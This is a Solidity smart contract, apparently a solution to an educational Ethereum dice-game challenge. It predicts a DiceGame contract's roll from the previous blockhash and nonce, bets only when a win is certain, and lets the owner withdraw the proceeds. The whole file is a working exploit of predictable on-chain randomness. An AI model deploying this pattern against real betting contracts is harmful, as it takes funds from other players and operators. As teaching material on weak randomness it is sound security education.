pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    address payable private _diceGameAddress;

    constructor(address payable diceGameAddress) {
        _diceGameAddress = diceGameAddress;
        diceGame = DiceGame(_diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner() {
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function predictRoll() public view returns (uint256) {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hasha = keccak256(abi.encodePacked(prevHash, _diceGameAddress, diceGame.nonce()));
        uint256 predictedRoll = uint256(hasha) % 16;

        return predictedRoll;
    }

    function riggedRoll() public {
        require(address(this).balance >= .002 ether, "Not enough ether in contract");
        uint256 betAmount = .002 ether;

        uint256 predictedRoll = predictRoll();
        console.log("Dice Game Predicted Roll: ", predictedRoll);

        if ( predictedRoll <= 2 ) {
            diceGame.rollTheDice{value: betAmount}();
        } else {
            return;
        }
    }

    receive() external payable {  }
    
}
